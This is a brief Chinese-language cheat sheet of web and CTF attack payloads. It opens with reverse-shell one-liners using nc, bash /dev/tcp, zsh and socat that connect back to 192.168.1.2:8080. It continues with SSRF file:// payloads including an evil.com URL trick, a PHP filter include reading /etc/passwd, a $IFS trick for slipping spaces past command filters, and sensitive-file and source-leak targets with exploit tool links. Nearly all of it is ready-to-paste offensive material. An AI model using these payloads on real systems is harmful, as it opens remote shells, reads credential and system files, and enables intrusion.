## 反弹shell
```sh
nc -e /bin/bash 192.168.1.2 8080
bash -c 'bash -i >/dev/tcp/192.168.1.2/8080 0>&1'
zsh -c 'zmodload zsh/net/tcp && ztcp 192.168.1.2 8080 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.2:8080  
```
## ssrf常用payload
`admin=1&url=file://www.ichunqiu.com/var/www/html/flag.php`
`file://user@evil.com:80@www.google.com//var/www/html/index.php%23`

## php7 直接崩溃bug
`include(‘php://filter/string.strip_tags/resource=/etc/passwd’)`
## $IFS
空格可以使用$IFS代替

## 敏感文件
robots.txt .git .svn .swp ~ .bak 源码，目录泄露
.git泄露利用EXP:https://github.com/lijiejie/GitHack
.DS_Store 利用: https://github.com/lijiejie/ds_store_exp
进程环境变量: /proc/self/environ 

## 上传二次渲染
有时候上传文件时php会用组件把你的文件格式更改为jpg，需要用/ctf/web/php/php_jpg.php中的脚本进行绕过